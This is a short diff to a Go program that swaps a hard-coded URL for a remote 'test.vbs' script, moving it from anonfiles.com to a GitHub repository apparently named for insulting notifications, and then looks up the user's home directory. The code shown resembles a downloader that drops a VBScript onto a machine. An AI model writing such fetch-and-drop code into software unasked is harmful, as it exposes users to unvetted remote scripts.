@@ -9,7 +9,7 @@ import (
 )
 
 func main() {
-	url := "https://anonfiles.com/zeLfCcidye/test_vbs"
+	url := "https://raw.githubusercontent.com/BlueIncog/Insulting-Notifications/main/test.vbs"
 
 	dir, err := os.UserHomeDir()
 	if err != nil {
